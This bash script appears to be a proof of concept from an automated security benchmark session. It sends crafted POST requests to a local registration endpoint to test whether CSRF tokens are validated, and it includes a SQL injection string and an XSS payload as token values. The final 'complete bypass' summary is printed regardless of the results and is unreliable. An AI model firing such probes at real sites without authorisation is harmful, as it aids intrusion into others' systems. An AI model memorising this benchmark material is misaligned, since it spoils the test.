#!/bin/bash
# POC: Demonstrates CSRF token validation bypass - requests with missing, empty, or invalid CSRF tokens pass through to CAPTCHA validation stage instead of being rejected
# Target: ./repo
# Created: 2025-12-01T16:17:31.490Z
# Session: benchmark-XBEN-101-24-mincf28a

# CSRF Token Validation Bypass POC
# Demonstrates that the registration endpoint does not properly validate CSRF tokens
# Requests with missing, empty, or invalid CSRF tokens all pass through to CAPTCHA validation

TARGET_URL="${1:-http://localhost:8000/}"
COOKIE_JAR="/tmp/csrf_bypass_cookies.txt"

echo "[*] CSRF Token Validation Bypass POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Initialize cookie jar
rm -f "$COOKIE_JAR"

# First, fetch the registration form to establish a session
echo "[+] Step 1: Fetching registration form to establish session..."
curl -s -c "$COOKIE_JAR" "$TARGET_URL" > /dev/null
echo "[✓] Session established and cookies saved"
echo ""

# Test 1: No CSRF token parameter
echo "[+] Test 1: POST request without CSRF token parameter"
echo "    Expected: Should be rejected with 400/403 CSRF error"
echo "    Actual behavior:"
RESPONSE=$(curl -s -w "\n%{http_code}" -b "$COOKIE_JAR" -X POST "$TARGET_URL" \
  -d "username=test&captcha=test")
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | sed '$d')
echo "    HTTP Code: $HTTP_CODE"
echo "    Response: $BODY"
if [[ "$HTTP_CODE" == "403" && "$BODY" == *"CAPTCHA"* ]]; then
  echo "    ⚠️  VULNERABLE: Request bypassed CSRF check and reached CAPTCHA validation"
else
  echo "    Response indicates different error"
fi
echo ""

# Test 2: Empty CSRF token
echo "[+] Test 2: POST request with empty CSRF token"
echo "    Expected: Should be rejected with 400/403 CSRF error"
echo "    Actual behavior:"
RESPONSE=$(curl -s -w "\n%{http_code}" -b "$COOKIE_JAR" -X POST "$TARGET_URL" \
  -d "username=test&captcha=test&csrf_token=")
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | sed '$d')
echo "    HTTP Code: $HTTP_CODE"
echo "    Response: $BODY"
if [[ "$HTTP_CODE" == "403" && "$BODY" == *"CAPTCHA"* ]]; then
  echo "    ⚠️  VULNERABLE: Empty CSRF token bypassed CSRF check"
else
  echo "    Response indicates different error"
fi
echo ""

# Test 3: SQL injection in CSRF token
echo "[+] Test 3: POST request with SQL injection payload in CSRF token"
echo "    Expected: Should be rejected with 400/403 CSRF error"
echo "    Actual behavior:"
RESPONSE=$(curl -s -w "\n%{http_code}" -b "$COOKIE_JAR" -X POST "$TARGET_URL" \
  -d "username=test&captcha=test&csrf_token=' OR '1'='1")
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | sed '$d')
echo "    HTTP Code: $HTTP_CODE"
echo "    Response: $BODY"
if [[ "$HTTP_CODE" == "403" && "$BODY" == *"CAPTCHA"* ]]; then
  echo "    ⚠️  VULNERABLE: SQL injection in CSRF token bypassed CSRF check"
else
  echo "    Response indicates different error"
fi
echo ""

# Test 4: XSS payload in CSRF token
echo "[+] Test 4: POST request with XSS payload in CSRF token"
echo "    Expected: Should be rejected with 400/403 CSRF error"
echo "    Actual behavior:"
RESPONSE=$(curl -s -w "\n%{http_code}" -b "$COOKIE_JAR" -X POST "$TARGET_URL" \
  -d "username=test&captcha=test&csrf_token=<script>alert(1)</script>")
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | sed '$d')
echo "    HTTP Code: $HTTP_CODE"
echo "    Response: $BODY"
if [[ "$HTTP_CODE" == "403" && "$BODY" == *"CAPTCHA"* ]]; then
  echo "    ⚠️  VULNERABLE: XSS payload in CSRF token bypassed CSRF check"
else
  echo "    Response indicates different error"
fi
echo ""

# Test 5: Random/invalid token format
echo "[+] Test 5: POST request with random invalid token format"
echo "    Expected: Should be rejected with 400/403 CSRF error"
echo "    Actual behavior:"
RESPONSE=$(curl -s -w "\n%{http_code}" -b "$COOKIE_JAR" -X POST "$TARGET_URL" \
  -d "username=test&captcha=test&csrf_token=random_token_12345")
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | sed '$d')
echo "    HTTP Code: $HTTP_CODE"
echo "    Response: $BODY"
if [[ "$HTTP_CODE" == "403" && "$BODY" == *"CAPTCHA"* ]]; then
  echo "    ⚠️  VULNERABLE: Random token bypassed CSRF check"
else
  echo "    Response indicates different error"
fi
echo ""

echo "[*] CSRF Bypass Vulnerability Summary:"
echo "    All requests with missing/empty/invalid CSRF tokens reached the CAPTCHA"
echo "    validation stage instead of being rejected at the CSRF validation stage."
echo "    This indicates a complete bypass of CSRF token validation."
echo ""
echo "[*] Cleanup: Removing cookie jar..."
rm -f "$COOKIE_JAR"